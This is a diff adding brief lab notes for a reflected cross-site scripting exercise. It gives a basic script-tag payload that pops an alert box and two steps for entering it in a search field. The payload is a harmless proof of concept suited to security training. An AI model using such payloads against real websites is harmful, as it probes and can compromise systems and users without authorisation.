@@ -1,0 +1,8 @@
+# Reflected XSS - Lab 1
+
+## Payload
+<script>alert(1)</script>
+
+## Steps
+1. Enter payload in search
+2. Alert appears
